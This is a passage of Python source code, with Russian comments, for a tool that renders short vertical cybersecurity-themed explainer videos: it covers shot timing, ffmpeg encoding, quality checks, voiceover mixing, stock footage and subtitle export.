        segments.append({"kind": "body", "shot": s, "n": n_body})
        if n_trans and i < len(shots) - 1:
            segments.append({"kind": "trans", "a": s, "b": shots[i + 1],
                             "trans": s.get("trans_out", "hard_cut"), "n": n_trans})
    # финальный холд: добиваем ровно до целевой длины, чтобы видео
    # совпадало с аудио (иначе -shortest в mux обрежет финал)
    have = sum(sg["n"] for sg in segments)
    hold_n = max(0, int(round(seconds * fps)) - have)
    segments.append({"kind": "hold", "shot": shots[-1], "n": hold_n})
    total = sum(sg["n"] for sg in segments)
    return segments, bounds, total


def render_cinematic(shots, seconds, fps, out_silent, bpm, P, tmpdir="out/tmp_cine",
                     stock=None):
    ffmpeg = vg.find_ffmpeg()
    if not ffmpeg:
        raise RuntimeError("нет ffmpeg: pip install imageio-ffmpeg")
    fonts = build_fonts()
    segments, bounds, total = build_timeline(shots, seconds, fps, bpm)
    print(f"[cine] рендер {total} кадров ({W}x{H}, {fps} fps, ~{total / fps:.1f} c), "
          f"шотов: {len(shots)}...")
    cmd = [ffmpeg, "-y", "-f", "rawvideo", "-pix_fmt", "rgb24",
           "-s", f"{W}x{H}", "-framerate", str(fps), "-i", "-",
           "-vf", "eq=contrast=1.02:saturation=1.05",
           "-an", "-c:v", "libx265", "-pix_fmt", "yuv420p",
           "-preset", "medium", "-crf", "28", out_silent]
    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    done = 0
    for sg in segments:
        if sg["kind"] == "body":
            s = sg["shot"]
            for j in range(sg["n"]):
                # M26-B: ease-in-out прогресса — разгон/торможение вместо
                # линейного скольжения (линейные камеры = ощущение покадровости)
                p = _ease_io(j / max(1, sg["n"] - 1))
                proc.stdin.write(render_frame(s, p, fonts, P, stock).tobytes())
                done += 1
        elif sg["kind"] == "trans":
            a, b = sg["a"], sg["b"]
            img_a = render_frame(a, 1.0, fonts, P, stock)
            img_b = render_frame(b, 0.0, fonts, P, stock)
            for j in range(sg["n"]):
                q = _ease_io((j + 1) / sg["n"])
                proc.stdin.write(
                    transition_frame(img_a, img_b, sg["trans"], q, b.get("seed", 1)).tobytes())
                done += 1
        else:  # hold
            img = render_frame(sg["shot"], 1.0, fonts, P, stock)
            raw = img.tobytes()
            for _ in range(sg["n"]):
                proc.stdin.write(raw)
                done += 1
        if done % 120 == 0:
            print(f"[cine] ...{done}/{total}")
    proc.stdin.close()
    proc.wait()
    if proc.returncode != 0:
        raise RuntimeError("ffmpeg вернул ошибку при кодировании видео")
    print(f"[cine] видео готово: {out_silent}")
    return out_silent, bounds


# ---------- баланс монтажа и QC перед export ----------

def shot_kind(s):
    """cinematic | typography | graphic для шота."""
    t = s.get("type")
    if t in ("cinematic", "typography", "graphic"):
        return t
    if s.get("texts") and s.get("visual") in PURE_TYPO_VISUALS:
        return "typography"
    return "cinematic"


def enforce_balance(shots):
    """Гарантия принципа CINEMATIC->TEXT->CINEMATIC: двух ударных
    текстовых вставок подряд быть не должно (whisper-финал — исключение:
    «КТО КОГО» / пауза / «ЗАЩИЩАЕТ?» задуманы парой)."""
    out = [dict(s) for s in shots]
    prev_typo = False
    for s in out:
        texts = s.get("texts") or []
        is_typo = shot_kind(s) == "typography" and bool(texts)
        modes = {t.get("mode") for t in texts}
        if is_typo and prev_typo and not modes <= {"whisper"}:
            s["texts"] = []
            s["type"] = "cinematic"
            is_typo = False
        prev_typo = bool(is_typo)
    return out


def qc_shots(shots, seconds):
    """Чеклист качества ПЕРЕД рендером (п.15 ТЗ). Возвращает dict проверок,
    печатает отчёт. Текстовый fit — по построению в safe area, но проверяем."""
    from PIL import Image as _I, ImageDraw as _D
    scratch = _D.Draw(_I.new("RGB", (W, H)))
    rep = {}
    # 1-3: тексты в safe area, без обрезки и выхода за 1080x1920
    bad = []
    for s in shots:
        for t in s.get("texts") or []:
            f, fitted, gap = fit_text_block(scratch, t["lines"], t.get("mode", "pop"), None)
            for ln in fitted:
                w_ = (_tracked_width(scratch, ln, f, gap)[0]
                      if t.get("mode") == "tracking" else _ts(scratch, ln, f)[0])
                if w_ > SAFE_W:
                    bad.append((s.get("id"), ln))
    rep["texts_in_safe_area"] = not bad
    rep["no_clipped_words"] = not bad
    rep["no_text_outside_frame"] = not bad
    # 4: нет двух огромных текстовых блоков подряд
    dbl = False
    prev = False
    for s in shots:
        texts = s.get("texts") or []
        cur = shot_kind(s) == "typography" and bool(texts) and not (
            {t.get("mode") for t in texts} <= {"whisper"})
        if cur and prev:
            dbl = True
        prev = cur
    rep["no_double_text_blocks"] = not dbl
    # 5: есть cinematic shots (>=50%)
    kinds = [shot_kind(s) for s in shots]
    rep["has_cinematic_shots"] = (sum(1 for k_ in kinds if k_ == "cinematic")
                                  >= max(1, len(shots) // 2))
    # 6: variation длительностей (M15: минимум поднят ради читаемости,
    # поэтому проверяем разброс, а не наличие субсекундных кадров)
    durs = [round(s["dur"], 2) for s in shots]
    rep["dur_variation"] = (len(set(durs)) >= 5
                            and (max(durs) - min(durs)) >= 1.5)
    # 7: camera movement у каждого cinematic (чёрная пауза — исключение:
    # неподвижный чёрный кадр задуман, движение там невидимо)
    static_cine = [s.get("id") for s in shots
                   if shot_kind(s) == "cinematic" and s.get("camera") == "static"
                   and s.get("visual") != "pause_black"]
    rep["camera_movement"] = not static_cine
    # 8: transitions разнообразны
    rep["transitions"] = len({s.get("trans_out") for s in shots}) >= 3
    # 9: пауза перед кульминацией
    rep["pause_before_climax"] = any(
        s.get("act") == "twist" and (s.get("sfx") == "silence" or not s.get("texts"))
        for s in shots)
    # 10: rapid-часть climax быстрее пика (медленный финал whisper+brand
    # в сравнение не входит — замедление там задумано)
    SLOW_FINALE = {"pause_black", "final_q", "final_brand"}
    pre = [s["dur"] for s in shots if s.get("act") == "peak"]
    cli = [s["dur"] for s in shots if s.get("act") == "climax"
           and s.get("visual") not in SLOW_FINALE]
    rep["climax_faster"] = bool(pre and cli) and (
        sum(cli) / len(cli) < sum(pre) / len(pre))
    # 11: финал визуально отличается от начала
    rep["final_differs"] = shots[-1].get("visual") != shots[0].get("visual")
    # 12: красный только на threat (hook=warning, peak, accel-система;
    # attack_grid в climax — тоже threat-кадр)
    ok_acts = {"hook", "peak", "accel"}
    threat_vis = {"attack_grid", "phone_dark"}
    rep["red_discipline"] = all(
        s.get("accent") != "accent2"
        or s.get("act") in ok_acts or s.get("visual") in threat_vis
        for s in shots)
    # 13 (M15): субтитры тоже в safe area
    bad_sub = []
    for s in shots:
        for t in s.get("subs") or []:
            f, fitted, gap = fit_text_block(scratch, t["lines"], "sub", None)
            for ln in fitted:
                if _ts(scratch, ln, f)[0] > SAFE_W:
                    bad_sub.append((s.get("id"), ln))
    rep["subs_in_safe_area"] = not bad_sub
    # 14 (M15): озвучка покрывает все акты (якорные шоты; непрерывный трек)
    acts_voiced = {s.get("act") for s in shots if (s.get("voice") or "").strip()}
    rep["voice_covers_all"] = {"hook", "problem", "climax"} <= acts_voiced
    # 15 (M15): читаемость — длительность покрывает время чтения текста
    slow = [s.get("id") for s in shots if s["dur"] < _min_dur(s) - 1e-6]
    rep["reading_time_ok"] = not slow
    print("[cine][QC] " + " ".join(
        f"{k}={'OK' if v else 'FAIL'}" for k, v in rep.items()))
    if bad:
        print(f"[cine][QC] вне safe area: {bad[:4]}")
    if static_cine:
        print(f"[cine][QC] cinematic без движения камеры: {static_cine}")
    return rep


# ---------- EDL / SRT (M22: монтажный лист для 9:16 шортсов) ----------

def _dump_edl_cine(path, topic, style, seconds, fps, shots, bounds):
    """EDL JSON: все шоты с таймкодами, визуалом, текстом."""
    edl_shots = []
    for i, s in enumerate(shots):
        e = dict(s)
        e["start"] = round(bounds[i] if i < len(bounds) else 0.0, 3)
        e["end"] = round(bounds[i + 1] if i + 1 < len(bounds) else 0.0, 3)
        e.pop("stock", None)
        e.pop("seed", None)
        edl_shots.append(e)
    edl = {"app": "tgvk-cine", "version": 1, "topic": topic,
           "style": style, "seconds": seconds, "fps": fps,
           "aspect": "9:16", "shots": edl_shots}
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(edl, fh, ensure_ascii=False, indent=1)


def _srt_ts(sec):
    ms = int(sec * 1000)
    return (f"{ms // 3600000:02d}:{(ms // 60000) % 60:02d}:"
            f"{(ms // 1000) % 60:02d},{ms % 1000:03d}")


def _dump_srt_cine(path, shots, bounds):
    """SRT-субтитры: все шоты с текстом."""
    out = []
    n = 0
    for i, s in enumerate(shots):
        text = (s.get("sub") or s.get("voice") or "").strip()
        if not text:
            continue
        st = bounds[i] if i < len(bounds) else 0.0
        en = bounds[i + 1] if i + 1 < len(bounds) else st + 1.0
        n += 1
        out.append(f"{n}\n{_srt_ts(st)} --> {_srt_ts(en)}\n{text}\n")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(out))


def generate_cinematic(topic=None, seconds=55, style="cybersecurity_cinematic",
                        out="out/video_cine.mp4", fps=FPS_CINE,
                        voice=vg.VOICE_DEFAULT, no_audio=False, voice_over=None,
                        tmpdir="out/tmp_cine", script_shots=None, provider=None,
                        script_text=None, edl_out=None, srt_out=None,
                        variant=None):
    """Главная точка входа: тема -> cinematic-ролик MP4.

    script_text (M17): текст статьи -> план script_to_shots (диктор читает
    статью, субтитры синхронны, длина = длина озвучки). Без статьи —
    как раньше: LLM-план по теме, иначе generic-шаблон.
    """
    import shutil as _sh
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    os.makedirs(tmpdir, exist_ok=True)
    st, key = get_style(style)
    P = st["palette"]
    bpm = st.get("bpm", 100)
    topic = (topic or "Как вас взламывают через фишинг").strip()
    full_voice = False
    if script_text and str(script_text).strip():
        shots, seconds = script_to_shots(str(script_text), topic,
                                         seconds, key)
        full_voice = True
    else:
        shots = (list(script_shots) if script_shots
                 else plan_shots(topic, seconds, key, True, provider,
                                 variant))
    # монтажная гигиена: баланс cinematic/text
    shots = enforce_balance(shots)
    if voice_over is None:
        voice_over = bool(st.get("voice_over"))
    ffmpeg = vg.find_ffmpeg()
    if not ffmpeg:
        raise RuntimeError("нет ffmpeg: pip install imageio-ffmpeg")
    # --- M19: голос ведёт таймлайн. Реплики озвучиваются SSML (интонация
    # по актам, паузы между фразами), шоты встают под РЕАЛЬНУЮ длину голоса,
    # длинные реплики режутся на кадры ≤3с. Глобального ресайза больше нет —
    # именно он разъединял голос и картинку (монолит с t=0 поверх тянутых
    # шотов: диктор заканчивал раньше, хвост шёл в тишине).
    vmp3 = None
    voice_spans = []
    if voice_over and not no_audio:
        # якорные шоты (каждый 3-й + hook/twist/бренд) или ВСЕ в статье
        if full_voice:
            vmap = [(i, s) for i, s in enumerate(shots)
                    if (s.get("voice") or "").strip()]
        else:
            vmap = [(i, s) for i, s in enumerate(shots)
                    if ((s.get("voice") or "").strip()
                        and (i % 3 == 0 or s.get("act") in ("hook", "twist")
                             or s.get("visual") == "final_brand"))]
        if vmap:
            tsecs = []
            for _, s in vmap:
                rate, pitch, vol = _prosody(s.get("act"))
                tsecs.append({"voice": s["voice"], "caption": s["id"],
                              "rate": rate, "pitch": pitch, "volume": vol})
            _w = None
            try:
                vmp3, _w = vg.make_voiceover_sections(ffmpeg, tsecs, voice,
                                                      tmpdir)
            except Exception as e:
                print(f"[cine] TTS не удался ({type(e).__name__}) "
                      f"— оценка по символам")
                vmp3, _w = None, None
            if _w and len(_w) == len(vmap):
                # w = голос + вшитая пауза 0.5 (у последнего чанка паузы нет)
                sec_durs = [float(w) - (0.5 if j < len(vmap) - 1 else 0.0)
                            for j, w in enumerate(_w)]
            else:
                sec_durs = [max(1.5, len(s["voice"]) / 14.0)
                            for _, s in vmap]
                vmp3 = None
            voice_spans = _layout_voice_spans(shots, vmap, sec_durs)
            voiced_ids = {id(s) for sp in voice_spans for s in sp["refs"]}
            _fit_fillers(shots, voiced_ids, seconds, full_voice)
            seconds = sum(float(s["dur"]) for s in shots)
    # минимум читаемости — только вверх (синхрон голоса не ломаем)
    for s in shots:
        if (s.get("texts") or s.get("subs")) and s["dur"] < _min_dur(s):
            s["dur"] = float(_min_dur(s))
    # S30: subs sync — compute voice_ratio (voice_dur / shot_dur) for each shot
    # so subs fade out when voice ends, not at shot end
    for s in shots:
        vs = s.get("_voice_sec", 0)
        if vs > 0:
            s["_voice_ratio"] = min(1.0, vs / max(0.1, float(s["dur"])))
        else:
            s["_voice_ratio"] = 1.0  # no voice → subs visible for full shot
    # QC-чеклист — по финальным длительностям, до рендера
    rep = qc_shots(shots, seconds)
    # --- M24: живые сток-фоны — запросы ИЗ темы (а не из фиксированного пресета).
    # S28: Ken Burns эффект — статичные картинки с движением камеры.
    # Без PEXELS_API_KEY / при ошибке — только painters, ничего не падает.
    stock = None
    try:
        themes = extract_visual_theme(topic)
        queries = generate_stock_queries(topic, themes, max_q=6)
        # también добавляем queries из стиля как fallback
        style_q = st.get("stock_queries") or ()
        all_q = list(queries)
        for q in style_q:
            if q not in all_q:
                all_q.append(q)
        # S28: запросы из КОНТЕКСТА самих шотов (реплики каждого
        # акта) — клипы соответствуют содержанию конкретных кадров, а не
        # только общему топику. Используем _VOICE_STOCK_KW (content-level)
        # плюс _TOPIC_STOCK_KW (topic-level) как fallback.
        for s in shots:
            txt = " " + (s.get("voice") or s.get("sub") or "").lower() + " "
            # Content-level: _VOICE_STOCK_KW (per-shot voice text matching)
            for kw, qs in _VOICE_STOCK_KW.items():
                if kw in txt:
                    for q in qs:
                        if q not in all_q:
                            all_q.append(q)
            # Topic-level: _TOPIC_STOCK_KW (fallback)
            for kw, qs in _TOPIC_STOCK_KW.items():
                if kw in txt:
                    for q in qs:
                        if q not in all_q:
                            all_q.append(q)
        all_q = all_q[:8]
        clips, clip_q = (fetch_stock_clips(tmpdir, all_q, max_clips=8)
                         if all_q else ([], []))
        # S28: скачиваем КАРТИНКИ для Ken Burns (fallback для шотов без клипов)
        img_paths, img_queries = (fetch_stock_images(tmpdir, all_q, max_images=4)
                                  if all_q else ([], []))
        if clips and clip_q:
            clip_groups = extract_stock_frames(
                ffmpeg, clips, os.path.join(tmpdir, "stock_frames"))
            if clip_groups:
                stock = {"frames": clip_groups, "cache": {},
                         "images": img_paths, "img_queries": img_queries}
                # M26: ВСЕ шоты получают живой фон, но клип подбирается
                # ПО КОНТЕКСТУ шота (его реплика/вижуал), а не по кругу —
                # картинка соответствует тому, что говорит диктор.
                assign = _assign_stock_clips(shots, clip_groups, clip_q, topic)
                for idx, s in enumerate(shots):
                    s["stock"] = assign.get(idx, idx % len(clip_groups))
                print(f"[cine] живые фоны назначены ВСЕМ {len(shots)} шотам "
                      f"({len(clip_groups)} клипов, {len(img_paths)} картинок, "
                      f"запросы: {', '.join(all_q[:3])}...)")
            else:
                stock = None
        elif img_paths:
            # S28: нет видео-клипов, но есть картинки — Ken Burns
            stock = {"frames": [], "cache": {},
                     "images": img_paths, "img_queries": img_queries}
            # назначаем картинки шотам по кругу
            for idx, s in enumerate(shots):
                s["stock"] = idx % len(img_paths)
                s["_is_image"] = True
            print(f"[cine] Ken Burns: {len(img_paths)} картинок назначены "
                  f"{len(shots)} шотам")
        else:
            stock = None
    except Exception as e:
        print(f"[cine] сток недоступен ({type(e).__name__}) — только painters")
        stock = None
    # окно паузы (twist) — для просадки бита
    pause_win = None
    acc = 0.0
    for s in shots:
        if s["act"] == "twist" and pause_win is None:
            pause_win = (acc, acc + s["dur"])
        acc += s["dur"]
    silent = os.path.join(tmpdir, "silent.mp4")
    _, bounds = render_cinematic(shots, seconds, fps, silent, bpm, P, tmpdir,
                                 stock)
    real_dur = bounds[-1]
    # M19: голос собирается точно на шоты — чанк j стартует на своём кадре
    # (bounds = концы шотов после beat-снапа, bounds[i] = старт шота i)
    if vmp3 and voice_spans and np is not None and not no_audio:
        try:
            idx_of = {id(s): i for i, s in enumerate(shots)}
            items = []
            for sp in voice_spans:
                i0 = idx_of.get(id(sp["refs"][0]))
                if i0 is None or i0 >= len(bounds):
                    continue
                items.append((os.path.join(tmpdir, f"sec_{sp['sec']}.mp3"),
                              float(bounds[i0])))
            total_v = sum(float(s["dur"]) for s in shots)
            vmix = _assemble_voice(ffmpeg, tmpdir, items, total_v, SR)
            if vmix:
                vmp3 = vmix
                print(f"[cine] голос собран на таймлайн: {len(items)} чанков")
        except Exception as e:
            print(f"[cine] сборка голоса не удалась ({type(e).__name__}) "
                  f"— монолит с начала")
    if no_audio or np is None:
        if np is None:
            print("[cine] numpy нет — видео без звука")
        _sh.copy(silent, out)
    else:
        # голос -> wav + огибающая для дакинга бита под речью
        duck = None
        vw = None
        vv = None
        if vmp3:
            vw = os.path.join(tmpdir, "voice.wav")
            r = subprocess.run(
                [ffmpeg, "-y", "-i", vmp3, "-ar", str(SR), "-ac", "1", vw],
                capture_output=True)
            if r.returncode == 0:
                with wave.open(vw, "rb") as wf:
                    raw = wf.readframes(wf.getnframes())
                vv = np.frombuffer(raw, dtype=np.int16).astype(np.float64) * 1.1
                # RMS-огибающая окном 0.2с -> 0..1
                n = int(real_dur * SR)
                a = np.abs(vv[:n])
                wsize = max(1, int(SR * 0.2))
                cs = np.cumsum(np.insert(a, 0, 0.0))
                env = (cs[wsize:] - cs[:-wsize]) / wsize
                env = np.concatenate([env, np.full(max(0, n - len(env)), 0.0)])[:n]
                mx = env.max()
                duck = (env / mx) if mx > 0 else np.zeros(n)
        mix = build_soundtrack(shots, bounds, real_dur, bpm, pause_win,
                               bed=float(st.get("bed_level", 1.0)),
                               sfx_gain=float(st.get("sfx_level", 1.0)),
                               duck=duck)
        bed_wav = os.path.join(tmpdir, "bed.wav")
        write_wav(bed_wav, mix)
        if vw is not None and vv is not None:
            # голос поверх приглушённого бита
            m = min(len(vv), len(mix))
            mix2 = mix.astype(np.float64)
            mix2[:m] += vv[:m]
            mix2 = np.clip(mix2, -32768, 32767).astype(np.int16)
            write_wav(bed_wav, mix2)
        vg.mux_audio(ffmpeg, silent, bed_wav, out, real_dur)
    size = os.path.getsize(out)
    print(f"[cine] ГОТОВО: {out} ({size / 1048576:.1f} MB, {real_dur:.1f} c, стиль {key})")
    # --- EDL/SRT экспорт (M22: монтажный лист + субтитры для 9:16) ---
    if edl_out:
        try:
            _dump_edl_cine(edl_out, topic, key, seconds, fps, shots, bounds)
            print(f"[cine] EDL: {edl_out}")
        except Exception as e:
            print(f"[cine] EDL не удался ({type(e).__name__})")
    if srt_out:
        try:
            _dump_srt_cine(srt_out, shots, bounds)
            print(f"[cine] SRT: {srt_out}")
        except Exception as e:
            print(f"[cine] SRT не удался ({type(e).__name__})")
    return out


def generate_video(topic, duration=55, style="cybersecurity_cinematic",
                   variant=None, **kw):
    """Алиас в духе generateVideo({topic, duration, style})."""
    return generate_cinematic(topic=topic, seconds=duration, style=style,
                              variant=variant, **kw)
